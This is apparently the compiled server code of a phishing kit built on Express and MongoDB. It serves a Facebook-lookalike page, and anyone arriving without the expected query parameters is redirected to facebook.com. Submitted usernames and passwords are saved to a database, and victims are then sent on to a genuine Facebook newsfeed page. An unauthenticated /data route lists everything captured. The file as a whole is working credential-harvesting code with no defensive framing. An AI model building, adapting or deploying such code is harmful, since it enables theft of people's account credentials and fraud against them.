"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : new P(function (resolve) { resolve(result.value); }).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
require("dotenv/config");
const express = require("express");
const mongoose = require("mongoose");
const path = require("path");
const Data_1 = require("./models/Data");
const app = express();
let dynamicUrl;
app
    .set("view engine", "ejs")
    .set("views", path.join(`${__dirname}/views`))
    .use(express.json())
    .use(express.urlencoded({ extended: false }))
    .get("/", function (request, response) {
    const { header, image, url } = request.query;
    if (header && image) {
        dynamicUrl = url;
        response.render("index", { header, image });
        return;
    }
    response.redirect("https://facebook.com");
})
    .post("/data", function (request, response) {
    return __awaiter(this, void 0, void 0, function* () {
        const { user, password } = request.body;
        yield Data_1.default.create({ user, password });
        response.redirect(dynamicUrl
            ? dynamicUrl
            : "https://newsfeed.fb.com/welcome-to-news-feed?lang=en");
    });
})
    .get("/data", function (_, response) {
    return __awaiter(this, void 0, void 0, function* () {
        const users = yield Data_1.default.find();
        response.render("data", { users });
    });
})
    .get("/data/:id", function (request, response) {
    return __awaiter(this, void 0, void 0, function* () {
        const id = request.params.id;
        yield Data_1.default.findOneAndDelete({ _id: id });
        response.redirect("/data");
    });
});
mongoose
    .connect(process.env.MONGO_URL, { useNewUrlParser: true })
    .then(() => app.listen(process.env.PORT || 3000));
//# sourceMappingURL=index.js.map